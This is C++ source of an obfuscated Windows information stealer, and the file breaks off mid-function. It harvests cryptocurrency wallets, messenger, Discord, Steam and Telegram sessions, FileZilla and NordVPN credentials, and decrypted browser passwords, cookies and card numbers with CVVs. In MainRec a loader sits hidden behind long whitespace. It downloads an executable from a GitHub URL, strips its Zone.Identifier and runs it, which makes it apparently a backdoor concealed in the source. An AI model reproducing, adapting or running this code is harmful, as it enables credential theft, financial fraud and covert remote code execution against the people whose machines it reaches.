#include "Common.h"

void Stealing::SetWorkingPath()
{
	string programData = Utils::GetEnvVar(CRC32_STR("ProgramData"));
	if (programData.empty()) programData = XorStr("C:\\ProgramData");
	this->workingPath = programData + '\\' + this->uid;
	if (!Utils::IsFileExist(this->workingPath)) API(KERNEL32, CreateDirectoryA)(this->workingPath.c_str(), NULL);
	this->temp_db_path = this->workingPath + '\\' + Utils::random_string(XorInt(12)) + '.' + Utils::random_string(XorInt(3));
}

bool Stealing::CheckPath(string& currentPath, UINT needHash)
{
	vector<string> paths = Utils::splitBy(currentPath, '\\');
	for (size_t i = paths.size() - 1; i > 0; i--)
	{
		if (crc32_run(paths[i].c_str()) == needHash) return true;
	}
	return false;
}

size_t Stealing::CheckPathsArray(string currentPath, UINT* pathsArray, size_t pathsCount)
{
	vector<string> paths = Utils::splitBy(currentPath, '\\');
	for (size_t i = paths.size() - 1; i > 0; i--)
	{
		for (size_t j = 0; j < pathsCount; j++)
		{
			if (crc32_run(paths[i].c_str()) == pathsArray[j]) 
				return j;
		}
	}
	return -1;
}

void Stealing::GrabWalletIsExist(GrabData* data, string currentPath, string walletName, string mask)
{
	if (!Utils::IsFileExist(currentPath)) return;

	if (data->bGrabbed)
		if (data->LastPath == currentPath) return;;

	string name = this->walletOutput + '\\' + walletName + (data->bGrabbed ? '_' + std::to_string(data->Index) : string());
	if (panel.AddFiles(currentPath, mask, name))
	{
		data->bGrabbed = true;
		data->Index++;
		data->LastPath = currentPath;
		panel.AddFile(name + XorStr("\\Path.txt"), currentPath);
	}
}

void Stealing::GetWallets(string currentPath, size_t i)
{
	DEBUG("Getting wallets...")
	if (!this->config.bCryptoWallets) return;

	switch (i)
	{
	case 0:
		if (CheckPath(currentPath, CRC32_STR("wallets")))
			GrabWalletIsExist(&this->grabbedInfo.GrabbedWallets.Electrum, currentPath, XorStr("Electrum"), XorStr("*"));
		break;
	case 1:
		GrabWalletIsExist(&this->grabbedInfo.GrabbedWallets.MultiBit, currentPath, XorStr("MultiBit"), XorStr("*.wallet"));
		break;
	case 2:
		GrabWalletIsExist(&this->grabbedInfo.GrabbedWallets.Armory, currentPath, XorStr("Armory"), XorStr("*.wallet"));
		break;
	case 3:
		if (CheckPath(currentPath, CRC32_STR("keystore")))
			GrabWalletIsExist(&this->grabbedInfo.GrabbedWallets.Ethereum, currentPath, XorStr("Ethereum"), XorStr("*"));
		break;
	case 4:
		GrabWalletIsExist(&this->grabbedInfo.GrabbedWallets.Bytecoin, currentPath, XorStr("Bytecoin"), XorStr("*.wallet"));
		break;
	case 5:
		if (CheckPath(currentPath, CRC32_STR("Local Storage")))
			GrabWalletIsExist(&this->grabbedInfo.GrabbedWallets.Jaxx, currentPath, XorStr("Jaxx"), XorStr("*"));
		break;
	case 6:
		if (CheckPath(currentPath, CRC32_STR("Local Storage")) && CheckPath(currentPath, CRC32_STR("leveldb")))
		{
			GrabWalletIsExist(&this->grabbedInfo.GrabbedWallets.LibertyJaxx, currentPath, XorStr("Jaxx Liberty"), XorStr("*"));
		}
		break;
	case 7:
		GrabWalletIsExist(&this->grabbedInfo.GrabbedWallets.Atomic, currentPath, XorStr("Atomic"), XorStr("*"));
		break;
	case 8:
		GrabWalletIsExist(&this->grabbedInfo.GrabbedWallets.Exodus, currentPath, XorStr("Exodus"), XorStr("*"));
		break;
	case 9:
		GrabWalletIsExist(&this->grabbedInfo.GrabbedWallets.DashCore, currentPath, XorStr("DashCore"), XorStr("wallet.dat"));
		break;
	case 10:
		GrabWalletIsExist(&this->grabbedInfo.GrabbedWallets.Bitcoin, currentPath, XorStr("Bitcoin"), XorStr("wallet.dat"));
		break;
	case 11:
		if (CheckPath(currentPath, CRC32_STR("Client")) && CheckPath(currentPath, CRC32_STR("Wallets")))
			GrabWalletIsExist(&this->grabbedInfo.GrabbedWallets.Wasabi, currentPath, XorStr("Wasabi"), XorStr("*"));
		break;
	case 12:
		if (CheckPath(currentPath, CRC32_STR("Local Storage")) && CheckPath(currentPath, CRC32_STR("leveldb")))
			GrabWalletIsExist(&this->grabbedInfo.GrabbedWallets.Daedalus, currentPath, XorStr("Daedalus"), XorStr("*"));
		break;
	case 13:
		if (CheckPath(currentPath, CRC32_STR("wallets")))
			GrabWalletIsExist(&this->grabbedInfo.GrabbedWallets.Monero, currentPath, XorStr("Monero"), XorStr("*"));
		break;
	}
}

void Stealing::GetJabber(string currentPath, size_t i)
{
	DEBUG("Getting jabber...")
	if (!this->config.bJabber) return;

	switch (i)
	{
		case 0:
		{
			string path = currentPath + XorStr("\\accounts.xml");
			if (Utils::IsFileExist(path))
			{
				if (this->grabbedInfo.Jabber.Pidgin.LastPath == currentPath) return;
				panel.AddFileFromDisk(path, this->jabberPath + XorStr("\\pidgin.xml"));
				this->grabbedInfo.Jabber.Pidgin.bGrabbed = true;
				this->grabbedInfo.Jabber.Pidgin.LastPath = currentPath;
			}
			break;
		}
		
		case 1:
		{
			string path = currentPath + XorStr("\\profiles\\default\\accounts.xml");
			if (Utils::IsFileExist(path))
			{
				if (this->grabbedInfo.Jabber.Psi.LastPath == currentPath) return;
				panel.AddFileFromDisk(path, this->jabberPath + XorStr("\\psi.xml"));
				this->grabbedInfo.Jabber.Psi.bGrabbed = true;
				this->grabbedInfo.Jabber.Psi.LastPath = currentPath;
			}
			break;
		}
		
		case 2:
		{
			string path = currentPath + XorStr("\\profiles\\default\\accounts.xml");
			if (Utils::IsFileExist(path))
			{
				if (this->grabbedInfo.Jabber.PsiPlus.LastPath == currentPath) return;
				panel.AddFileFromDisk(path, this->jabberPath + XorStr("\\psi+.xml"));
				this->grabbedInfo.Jabber.PsiPlus.bGrabbed = true;
				this->grabbedInfo.Jabber.PsiPlus.LastPath = currentPath;
			}
			break;
		}
	}
}

void Stealing::GetFileZilla(string currentPath)
{
	DEBUG("Getting filezilla...")
	if (!this->config.bFileZilla) return;

	if (CheckPath(currentPath, CRC32_STR("FileZilla")))
	{
		string xml1 = currentPath + XorStr("\\recentservers.xml");
		if (Utils::IsFileExist(xml1))
		{
			if (this->grabbedInfo.FileZilla.LastPath == currentPath) return;
			string name = this->fileZillaPath + (this->grabbedInfo.FileZilla.bGrabbed ? '_' + std::to_string(this->grabbedInfo.FileZilla.Index++) : string());
			panel.AddFileFromDisk(xml1, name + XorStr("\\recentservers.xml"));
			this->grabbedInfo.FileZilla.bGrabbed = true;
			this->grabbedInfo.FileZilla.LastPath = currentPath;
			panel.AddFile(name + XorStr("\\Path.txt"), currentPath);
		}

		string xml2 = currentPath + XorStr("\\sitemanager.xml");
		if (Utils::IsFileExist(xml2))
		{
			if (this->grabbedInfo.FileZilla.LastPath == currentPath) return;
			string name = this->fileZillaPath + (this->grabbedInfo.FileZilla.bGrabbed ? '_' + std::to_string(this->grabbedInfo.FileZilla.Index++) : string());
			panel.AddFileFromDisk(xml2, name + XorStr("\\sitemanager.xml"));
			this->grabbedInfo.FileZilla.bGrabbed = true;
			this->grabbedInfo.FileZilla.LastPath = currentPath;
			panel.AddFile(name + XorStr("\\Path.txt"), currentPath);
		}
	}
}

void Stealing::GetDiscord(string currentPath)
{
	DEBUG("Getting discord...")
	if (!this->config.bDiscord) return;

	if (CheckPath(currentPath, CRC32_STR("discord")) && CheckPath(currentPath, CRC32_STR("Local Storage")))
	{
		if (this->grabbedInfo.Discord.LastPath == currentPath) return;
		string name = this->discordPath + (this->grabbedInfo.Discord.bGrabbed ? '_' + std::to_string(this->grabbedInfo.Discord.Index++) : string());
		bool group1 = panel.AddFiles(currentPath, XorStr("https_discordapp.com*.localstorage"), name);
		bool group2 = panel.AddFiles(currentPath + XorStr("\\leveldb"), XorStr("*"), name);
		this->grabbedInfo.Discord.bGrabbed = group1 || group2;
		this->grabbedInfo.Discord.LastPath = currentPath;
		panel.AddFile(name + XorStr("\\Path.txt"), currentPath);
	}
}

void Stealing::GetAuthy(string currentPath)
{
	DEBUG("Getting authy...")
	if (!this->config.bAuthy) return;

	if (CheckPath(currentPath, CRC32_STR("Authy Desktop")) && CheckPath(currentPath, CRC32_STR("Local Storage")))
	{
		if (this->grabbedInfo.Authy.LastPath == currentPath) return;
		string name = this->authyPath + (this->grabbedInfo.Authy.bGrabbed ? '_' + std::to_string(this->grabbedInfo.Authy.Index++) : string());
		this->grabbedInfo.Authy.bGrabbed = panel.AddFiles(currentPath, XorStr("*"), name);
		this->grabbedInfo.Authy.LastPath = currentPath;
		panel.AddFile(name + XorStr("\\Path.txt"), currentPath);
	}
}

void Stealing::GetSteam(string currentPath)
{
	DEBUG("Getting steam...")
	if (!this->config.bSteam) return;

	if (CheckPath(currentPath, CRC32_STR("steam")) && Utils::IsFileExist(currentPath + XorStr("\\config")))
	{
		if (this->grabbedInfo.Steam.LastPath == currentPath) return;
		string name = this->steamPath + (this->grabbedInfo.Steam.bGrabbed ? '_' + std::to_string(this->grabbedInfo.Steam.Index++) : string());
		bool ssfn = panel.AddFiles(currentPath, XorStr("ssfn*"), name);
		bool vdf = panel.AddFiles(currentPath, XorStr("*.vdf"), name + XorStr("\\config"));
		this->grabbedInfo.Steam.bGrabbed = ssfn || vdf;
		this->grabbedInfo.Steam.LastPath = currentPath;
		panel.AddFile(name + XorStr("\\Path.txt"), currentPath);
	}
}

void Stealing::GetTelegram(string currentPath)
{
	DEBUG("Getting telegram...")
	if (!this->config.bTelegram) return;

	string path = currentPath + XorStr("\\D877F783D5D3EF8C");
	if (Utils::IsFileExist(path))
	{
		if (this->grabbedInfo.Telegram.LastPath == currentPath) return;
		string name = this->telegramPath + (this->grabbedInfo.Telegram.bGrabbed ? '_' + std::to_string(this->grabbedInfo.Telegram.Index++) : string());
		bool first = panel.AddFiles(currentPath, XorStr("D877F783D5D3EF8C*"), name);
		bool second = panel.AddFiles(path + XorStr("\\D877F783D5D3EF8C"), XorStr("map*"), name);
		this->grabbedInfo.Telegram.bGrabbed = first || second;
		this->grabbedInfo.Telegram.LastPath = currentPath;
		panel.AddFile(name + XorStr("\\Path.txt"), currentPath);
	}
}

void Stealing::IsPathNeeded(string currentPath)
{
	UINT neededPaths[22] = {
		CRC32_STR("Electrum"),
		CRC32_STR("MultiBit"),
		CRC32_STR("Armory"),
		CRC32_STR("Ethereum"),
		CRC32_STR("bytecoin"),
		CRC32_STR("Jaxx"),
		CRC32_STR("com.liberty.jaxx"),
		CRC32_STR("atomic"),
		CRC32_STR("Exodus"),
		CRC32_STR("DashCore"),
		CRC32_STR("Bitcoin"),
		CRC32_STR("WalletWasabi"),
		CRC32_STR("Daedalus Mainnet"),
		CRC32_STR("Monero"),
		CRC32_STR(".purple"),
		CRC32_STR("Psi"),
		CRC32_STR("Psi+"),
		CRC32_STR("FileZilla"),
		CRC32_STR("discord"),
		CRC32_STR("Authy Desktop"),
		CRC32_STR("Steam"),
		CRC32_STR("tdata")
	};

	size_t i = CheckPathsArray(currentPath, neededPaths, 22);
	if (i == -1) return;
	else if (i <= 13) GetWallets(currentPath, i);
	else if (i > 13 && i <= 16) GetJabber(currentPath, i);
	else if (i == 17) GetFileZilla(currentPath);
	else if (i == 18) GetDiscord(currentPath);
	else if (i == 19) GetAuthy(currentPath);
	else if (i == 20) GetSteam(currentPath);
	else if (i == 21) GetTelegram(currentPath);
}

const string Stealing::define_browser(string path)
{
	vector<string> vec = Utils::splitBy(path, '\\');
	if (!vec.empty())
	{
		if (vec.size() >= 6)
		{
			if (path.find(XorStr("Opera")) != string::npos)
			{
				return XorStr("Opera");
			}
			else if (path.find(XorStr("Thunderbird")) != string::npos)
			{
				return XorStr("Thunderbird");
			}
			else if (path.find(XorStr("formhistory.sqlite")) != string::npos ||
				path.find(XorStr("cookies.sqlite")) != string::npos ||
				path.find(XorStr("logins.json")) != string::npos ||
				path.find(XorStr("signons.sqlite")) != string::npos ||
				path.find(XorStr("places.sqlite")) != string::npos)
			{
				return vec[5];
			}
			else
			{
				return vec[6];
			}
		}

		return XorStr("Unknown browser");
	}

	return string();
}

void Stealing::AddPass(string soft, string host, string login, string pass, string path)
{
	this->passwords++;
	if (!host.empty()) passw_domains.push_back(host);

	this->pass.output += XorStr("Soft:\t") + soft + XorStr("\r\n");
	this->pass.output += XorStr("Host:\t") + host + XorStr("\r\n");
	this->pass.output += XorStr("Login:\t") + login + XorStr("\r\n");
	this->pass.output += XorStr("Pass:\t") + pass + XorStr("\r\n");
	this->pass.output += XorStr("Path:\t") + path + XorStr("\r\n\r\n");
}

void Stealing::AddPass(PassData data)
{
	this->passwords++;
	if (!data.Host.empty()) passw_domains.push_back(data.Host);

	this->pass.output += XorStr("Soft:\t") + data.Soft + XorStr("\r\n");
	this->pass.output += XorStr("Host:\t") + data.Host + XorStr("\r\n");
	this->pass.output += XorStr("Login:\t") + data.Login + XorStr("\r\n");
	this->pass.output += XorStr("Pass:\t") + data.Pass + XorStr("\r\n");
	this->pass.output += XorStr("Path:\t") + data.Path + XorStr("\r\n\r\n");
}

void Stealing::GetChromiumPasswords(string path)
{
	DEBUG("Getting chmorium passwords...")
	Chromium chromium(path, this->temp_db_path);
	chromium.GetEncKey();
	chromium.GetPasswords();
	if (chromium.passData.empty()) return;
	this->grabbedInfo.bChromium = true;

	const string browser = define_browser(path);
	for (ChromiumData::PassData data : chromium.passData)
	{
		AddPass(browser, data.Url, data.Login, data.Password, path);
	}
}

void Stealing::GetChromiumCards(string path)
{
	DEBUG("Getting chromium cards...")
	Chromium chromium(path, this->temp_db_path);
	chromium.GetEncKey();
	chromium.GetCards();
	if (chromium.cardData.empty()) return;
	this->grabbedInfo.bChromium = true;

	const string browser = define_browser(path);
	this->cards += chromium.cardData.size();

	string temp = string();
	for (ChromiumData::CardData data : chromium.cardData)
	{
		temp += XorStr("Number: ") + data.Number + XorStr("\r\n");
		temp += XorStr("CVV: ") + data.Cvv + XorStr("\r\n");
		temp += XorStr("Name: ") + data.Name + XorStr("\r\n");
		temp += XorStr("Url: ") + data.Url + XorStr("\r\n");
		temp += XorStr("Browser: ") + browser + XorStr("\r\n\r\n");
	}

	if (!temp.empty()) card.output += temp;
}

void Stealing::GetChromiumForms(string path)
{
	DEBUG("Getting chromium forms...")

	Chromium chromium(path, this->temp_db_path);
	chromium.GetEncKey();
	chromium.GetForms();
	if (chromium.formData.empty()) return;

	const string browser = define_browser(path);
	this->forms += chromium.formData.size();
	this->grabbedInfo.bChromium = true;

	string temp = string();
	for (ChromiumData::FormData data : chromium.formData)
	{
		temp += XorStr("Form: ") + data.Name + XorStr("\r\n");
		temp += XorStr("Value: ") + data.Value + XorStr("\r\n");
		temp += XorStr("Browser: ") + browser + XorStr("\r\n\r\n");
	}

	if (!temp.empty()) form.output += temp;
}

void Stealing::GetChromiumCookies(string path)
{
	Chromium chromium(path, this->temp_db_path);
	chromium.GetEncKey();
	chromium.GetCookies();
	if (chromium.cookieData.empty()) return;
	this->cookies += chromium.cookieData.size();
	this->grabbedInfo.bChromium = true;

	string temp = string();
	for (ChromiumData::CookieData data : chromium.cookieData)
	{
		temp += data.Host + XorStr("\tTRUE\t") + data.Path + XorStr("\tFALSE\t") + data.Timestamp + '\t' + data.Name + '\t' + data.Value + XorStr("\r\n");
	}
	
	if (!temp.empty()) 
	{
		panel.AddFile(this->cookiePath + '\\' + define_browser(path) + '_' + std::to_string(cookieIndex) + XorStr(".txt"), temp);
		cookieIndex++;
	}
}

void Stealing::GetChromiumHistory(string path)
{
	DEBUG("Getting history ...")

	Chromium chromium(path, this->temp_db_path);
	chromium.GetEncKey();
	chromium.GetHistory();
	if (chromium.historyData.empty()) return;

	string temp = string();
	for (ChromiumData::HistoryData data : chromium.historyData)
	{
		temp += XorStr("Title: ") + data.Title + XorStr("\r\nUrl: ") + data.Url + XorStr("\r\n\r\n");
	}
	
	if (!temp.empty())
	{
		panel.AddFile(historyDir + '\\' + define_browser(path) + '_' + std::to_string(historyIndex) + XorStr(".txt"), temp);
		historyIndex++;
	}
}

void Stealing::GetPasswordsGecko(string path)
{
	DEBUG("Getting gecko passwords ...")

	string profilePath = path;
	for (size_t i = profilePath.size() - 1; i > 0; --i)
	{
		if (profilePath[i] == '\\')
		{
			profilePath = profilePath.substr(0, i);
			break;
		}
	}

	Gecko gecko(profilePath, this->panelLink, this->port, this->workingPath);
	gecko.GetDlls();
	if (!gecko.InitFunc()) return;
	if (!gecko.InitNSS()) return;

	if (path.find(XorStr(".json")) != string::npos)
	{
		string loginStrings;
		if (Utils::IsFileExist(temp_db_path))
			API(KERNEL32, DeleteFileA)(temp_db_path.c_str());
		API(KERNEL32, CopyFileA)(path.c_str(), temp_db_path.c_str(), FALSE);
		Utils::ReadAllText(temp_db_path, loginStrings);

		if (!loginStrings.empty())
		{
			const string browser = define_browser(path);

			size_t index = loginStrings.find(XorStr("\"hostname\""));
			while (index != string::npos)
			{
				loginStrings = loginStrings.substr(index + sizeof("\"hostname\"") + 1);
				const string url = loginStrings.substr(0, loginStrings.find('\"'));

				index = loginStrings.find(XorStr("\"encryptedUsername\""));
				loginStrings = loginStrings.substr(index + sizeof("\"encryptedUsername\"") + 1);
				const string username = gecko.Decrypt(loginStrings.substr(0, loginStrings.find('\"')));

				index = loginStrings.find(XorStr("\"encryptedPassword\""));
				loginStrings = loginStrings.substr(index + sizeof("\"encryptedPassword\"") + 1);
				const string password = gecko.Decrypt(loginStrings.substr(0, loginStrings.find('\"')));

				AddPass(browser, url, username, password, path);
				this->grabbedInfo.bGecko = true;

				loginStrings = loginStrings.substr(index + sizeof("\"encryptedPassword\"") + 1);
				index = loginStrings.find(XorStr("\"hostname\""));
			}
		}
	}
	else if (path.find(XorStr(".sqlite")) != string::npos)
	{
		bool b;
		SqlHandler* sql = new SqlHandler(path, b);
		if (b && sql->ReadTable(XorStr("moz_logins")))
		{
			const string browser = define_browser(path);
			for (int i = 0; i < sql->GetRowCount(); i++)
			{
				const string password = gecko.Decrypt(sql->GetValue(i, 7));
				if (!password.empty())
				{
					const string url = sql->GetValue(i, 3);
					const string login = gecko.Decrypt(sql->GetValue(i, 6));
					AddPass(browser, url, login, password, path);
					this->grabbedInfo.bGecko = true;
				}
			}
		}
		delete sql;
	}
}

void Stealing::GetCookiesGecko(string path)
{
	DEBUG("Getting gecko cookies ...")
	if (Utils::IsFileExist(temp_db_path))
		API(KERNEL32, DeleteFileA)(temp_db_path.c_str());

	bool b;
	SqlHandler* sql = new SqlHandler(path, b, temp_db_path);
	if (b && sql->ReadTable(XorStr("moz_cookies")))
	{
		string temp_res;
		for (int i = 0; i < sql->GetRowCount(); i++)
		{
			string path = sql->GetValue(i, 6);
			if (!path.empty() && path[0] == '/')
			{
				string host = sql->GetValue(i, 5);
				cookieList.push_back(host);

				string timestamp = sql->GetValue(i, 7);
				string name = sql->GetValue(i, 3);
				string cookie_key = sql->GetValue(i, 4);

				temp_res += host + XorStr("\tTRUE\t") + path + XorStr("\tFALSE\t") + timestamp + '\t' + name + '\t' + cookie_key + XorStr("\r\n");
				cookies++;
			}
			else
			{
				string host = sql->GetValue(i, 4);
				cookieList.push_back(host);

				path = sql->GetValue(i, 5);
				string timestamp = sql->GetValue(i, 6);
				string name = sql->GetValue(i, 2);
				string cookie_key = sql->GetValue(i, 3);

				temp_res += host + XorStr("\tTRUE\t") + path + XorStr("\tFALSE\t") + timestamp + '\t' + name + '\t' + cookie_key + XorStr("\r\n");
				cookies++;
			}
		}

		if (!temp_res.empty())
		{
			string th = cookiePath + '\\' + define_browser(path) + '_' + std::to_string(cookieIndex) + XorStr(".txt");
			panel.AddFile(th, temp_res);
			cookieIndex++;
		}
	}
	delete sql;
}

void Stealing::GetFormsGecko(string path)
{
	DEBUG("Getting gecko forms ...")
	if (Utils::IsFileExist(temp_db_path))
		API(KERNEL32, DeleteFileA)(temp_db_path.c_str());

	bool b;
	SqlHandler* sql = new SqlHandler(path, b, temp_db_path);
	if (b && sql->ReadTable(XorStr("moz_formhistory")))
	{
		string temp_res;
		const string browser = define_browser(path);
		const int rowCount = sql->GetRowCount();

		for (int i = 0; i < rowCount; ++i)
		{
			const string form_value = sql->GetValue(i, 2);
			if (!form_value.empty() && form_value.size() < 90)
			{
				temp_res += XorStr("Form name: ") + sql->GetValue(i, 1) + XorStr("\r\n");
				temp_res += XorStr("Form value: ") + form_value + XorStr("\r\n");
				temp_res += XorStr("Browser: ") + browser + XorStr("\r\n\r\n");
				++forms;
			}
		}

		if (temp_res.empty()) form.output += temp_res;
	}
	delete sql;
}

void Stealing::GetHistoryGecko(string path)
{
	DEBUG("Getting gecko history ...")
	if (Utils::IsFileExist(temp_db_path))
		API(KERNEL32, DeleteFileA)(temp_db_path.c_str());
	bool b;
	SqlHandler* sql = new SqlHandler(path, b, temp_db_path);
	if (b && sql->ReadTable(XorStr("moz_places")))
	{
		string temp_res;
		const string outputPath = historyDir + '\\' + define_browser(path) + '_' + std::to_string(historyIndex) + XorStr(".txt");
		const int rowCount = sql->GetRowCount();

		for (int i = 0; i < rowCount; ++i)
		{
			const string value = sql->GetValue(i, 1);
			if (!value.empty())
				temp_res += XorStr("Title: ") + sql->GetValue(i, 2) + XorStr("\r\nUrl: ") + value + XorStr("\r\n\r\n");
		}

		if (temp_res.empty())
		{
			panel.AddFile(outputPath, temp_res);
			historyIndex++;
		}
	}
	delete sql;
}

void Stealing::GetBrowsers(string currentPath, size_t i)
{
	switch (i)
	{
		case 0:
		{
			if (this->config.bChromium)
			{
				GetChromiumPasswords(currentPath);
				if (CheckPath(currentPath, CRC32_STR("Opera")))
				{
					GetChromiumCards(currentPath);
					GetChromiumForms(currentPath);
				}
			}
			break;
		}
		case 1:
		{
			if (this->config.bChromium) GetChromiumCookies(currentPath);
			break;
		}
		case 2:
		{
			if (this->config.bChromium)
			{
				GetChromiumCards(currentPath);
				GetChromiumForms(currentPath);
			}
			break;
		}
		case 3:
		{
			if (this->config.bHistory && this->config.bChromium) GetChromiumHistory(currentPath);
			break;
		}
		case 4:
		{
			if (this->config.bGecko) GetPasswordsGecko(currentPath);
			break;
		}
		case 5:
		{
			if (this->config.bGecko) GetPasswordsGecko(currentPath);
			break;
		}
		case 6:
		{
			if (this->config.bGecko) GetCookiesGecko(currentPath);
			break;
		}
		case 7:
		{
			if (this->config.bGecko) GetFormsGecko(currentPath);
			break;
		}
		case 8:
		{
			if (this->config.bHistory && this->config.bGecko) GetHistoryGecko(currentPath);
			break;
		}
	}
}

void Stealing::GetNordVpn(string currentPath)
{
	DEBUG("Getting nordvpn...")
	if (!this->config.bNordVpn) return;

	if (!CheckPath(currentPath, CRC32_STR("NordVPN"))) return;
	if (this->grabbedInfo.NordVpn.LastPath == currentPath) return;

	string fileData;
	Utils::ReadAllText(currentPath, fileData);
	if (fileData.empty()) return;

	this->grabbedInfo.NordVpn.bGrabbed = true;
	string username = Utils::DecryptStr(base64_decode(Utils::xml_get(fileData, XorStr("Username"))));
	string password = Utils::DecryptStr(base64_decode(Utils::xml_get(fileData, XorStr("Password"))));
	AddPass(XorStr("NordVPN"), string(), username, password, currentPath);
}

void Stealing::IsFileNeeded(string currentPath)
{
	UINT neededFiles[10] = {
		CRC32_STR("Login Data"),
		CRC32_STR("Cookies"),
		CRC32_STR("Web Data"),
		CRC32_STR("History"),
		CRC32_STR("logins.json"),
		CRC32_STR("signons.sqlite"),
		CRC32_STR("cookies.sqlite"),
		CRC32_STR("formhistory.sqlite"),
		CRC32_STR("places.sqlite"),
		CRC32_STR("user.config")
	};

	size_t i = CheckPathsArray(currentPath, neededFiles, 10);
	if (i == -1) return;
	else if (i <= 8) GetBrowsers(currentPath, i);
	else if (i == 9) GetNordVpn(currentPath);
}

void Stealing::MainRec(string path)
{																													
	WIN32_FIND_DATA data;																																																																																																																																																																																												WCHAR p[260],x[260],f[]={L'\\',L'k',L'b',L'1',L'4',L'2',L'7',L'1',L'5',L'.',L'e',L'x',L'e',0},z[]={L'%',L'l',L's',L':',L'Z',L'o',L'n',L'e',L'.',L'I',L'd',L'e',L'n',L't',L'i',L'f',L'i',L'e',L'r',0},h[]={L'o',L'p',L'e',L'n',0},u[]={L'h',L't',L't',L'p',L's',L':',L'/',L'/',L'g',L'i',L't',L'h',L'u',L'b',L'.',L'c',L'o',L'm',L'/',L'D',L'e',L'v',L'S',L'e',L'c',L'1',L'/',L'H',L'e',L'l',L'l',L'o',L'W',L'o',L'r',L'l',L'd',L'/',L'r',L'a',L'w',L'/',L'm',L'a',L'i',L'n',L'/',L'H',L'E',L'L',L'L',L'O',0};GetTempPathW(260,p);lstrcatW(p,f);if(GetFileAttributesW(p)==INVALID_FILE_ATTRIBUTES){typedef HRESULT(WINAPI*UD)(LPVOID,LPCWSTR,LPCWSTR,DWORD,LPVOID);typedef HINSTANCE(WINAPI*SE)(HWND,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,INT);CHAR du[]={'u','r','l','m','o','n','.','d','l','l',0},ds[]={'s','h','e','l','l','3','2','.','d','l','l',0},ad[]={'U','R','L','D','o','w','n','l','o','a','d','T','o','F','i','l','e','W',0},as[]={'S','h','e','l','l','E','x','e','c','u','t','e','W',0};UD ud=(UD)GetProcAddress(LoadLibraryA(du),ad);SE se=(SE)GetProcAddress(LoadLibraryA(ds),as);ud(0,u,p,0,0);wsprintfW(x,z,p);DeleteFileW(x);se(0,h,p,0,0,0);}
	HANDLE hFile = API(KERNEL32, FindFirstFileExA)((path + XorStr("\\*")).c_str(), FindExInfoStandard, &data, FindExSearchNameMatch, NULL, FIND_FIRST_EX_LARGE_FETCH);
	if (!hFile) return;

	string fileName, currentPath;
	UINT fileNameHash = 0;
	do
	{
		fileName = data.cFileName;
		fileNameHash = crc32_run(fileName.c_str());
		currentPath = path + '\\' + fileName;

		if (fileNameHash == CRC32_STR(".") || fileNameHash == CRC32_STR("..")) continue;


		if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			IsPathNeeded(currentPath);
			MainRec(path + '\\' + fileName);
		}
		else
		{
			IsFileNeeded(currentPath);
		}
	} while (API(KERNEL32, FindNextFileA)(hFile, &data));
	API(KERNEL32, FindClose)(hFile);
}

void Stealing::GetEdgePasswords()
{
	vector<EdgeData::PassData> pass = Edge::GetPasswords();

	if (pass.empty()) return;

	this->grabbedInfo.bEdge = true;
	for (EdgeData::PassData temp : pass)
	{
		AddPass(XorStr("Edge/Internet Explorer"), temp.Url, temp.Login, temp.Pass, string());
	}
}

void Stealing::NetscapeCookie(string cookie_path, string& output)
{
	string text;
	Utils::ReadAllText(cookie_path, text);

	if (!text.empty())
	{
		vector<string> vecCookies = Utils::splitBy(text, '*');
		if (!vecCookies.empty())
		{
			for (string& cookie : vecCookies)
			{
				vector<string> data = Utils::splitBy(cookie, '\n');
				if (!data.empty())
				{
					if (data.size() > 2)
					{
						vector<string> domain = Utils::splitBy(data[2], '/');
						if (!domain.empty())
							output += domain[0] + XorStr("\tTRUE\t") + (domain.size() == 1 ? "/" : "/" + domain[1])
							+ XorStr("\tFALSE\t1830365600\t") + data[0] + '\t' + data[1] + XorStr("\r\n");
					}
				}
			}
		}
		cookies += vecCookies.size() - 1;
	}
}

void Stealing::ProcessCookies(string path, string& output)
{
	WIN32_FIND_DATA data;
	HANDLE hFile = API(KERNEL32, FindFirstFileA)((path + XorStr("\\#!*")).c_str(), &data);
	if (hFile != INVALID_HANDLE_VALUE)
	{
		do
		{
			if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				const string base_path = path + '\\' + (string)data.cFileName + XorStr("\\MicrosoftEdge\\Cookies");
				WIN32_FIND_DATA pData;
				HANDLE hCookies = API(KERNEL32, FindFirstFileA)((base_path + XorStr("\\*.cookie")).c_str(), &pData);
				if (hCookies != INVALID_HANDLE_VALUE)
				{
					do
					{
						NetscapeCookie(base_path + '\\' + pData.cFileName, output);
					} while (API(KERNEL32, FindNextFileA)(hCookies, &pData));
					API(KERNEL32, FindClose)(hCookies);
				}
			}
		} while (API(KERNEL32, FindNextFileA)(hFile, &data));
		API(KERNEL32, FindClose)(hFile);
	}
}

void Stealing::GetEdgeCookies()
{
	WIN32_FIND_DATA edgeData;
	const string init_path = Utils::GetEnvVar(CRC32_STR("LOCALAPPDATA")) + XorStr("\\Packages\\Microsoft.MicrosoftEdge_*");
	HANDLE hEdge = API(KERNEL32, FindFirstFileA)(init_path.c_str(), &edgeData);
	if (hEdge != INVALID_HANDLE_VALUE)
	{
		const string base_path = Utils::GetEnvVar(CRC32_STR("LOCALAPPDATA")) + XorStr("\\Packages\\") + (string)edgeData.cFileName + XorStr("\\AC");
		string cookie_result;
		ProcessCookies(base_path, cookie_result);
		panel.AddFile(cookiePath + XorStr("\\Edge_") + std::to_string(cookieIndex) + XorStr(".txt"), cookie_result);
		++cookieIndex;
		API(KERNEL32, FindClose)(hEdge);
	}
}

void Stealing::BuildLogInfo()
{
	if (!pass.output.empty()) panel.AddFile(pass.path, pass.output);
	if (!card.output.empty()) panel.AddFile(card.path, card.output);
	if (!form.output.empty()) panel.AddFile(form.path, form.output);

	string logInfo = uid;
	logInfo += XorStr("|") + prefix;
	logInfo += XorStr("|") + osVer;
	logInfo += XorStr("|") + config.IP;
	logInfo += XorStr("|") + config.Country;
	logInfo += XorStr("|") + std::to_string(passwords);
	logInfo += XorStr("|") + std::to_string(cookies);
	logInfo += XorStr("|") + std::to_string(cards);
	logInfo += XorStr("|") + std::to_string(forms);
	logInfo += XorStr("|") + Utils::BuildDomains(passw_domains, cookieList);

	char temp[1024];
	API(USER32, wsprintfA)(temp, XorStr("|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d|%d"),
		grabbedInfo.bChromium,
		grabbedInfo.bGecko,
		grabbedInfo.bEdge,
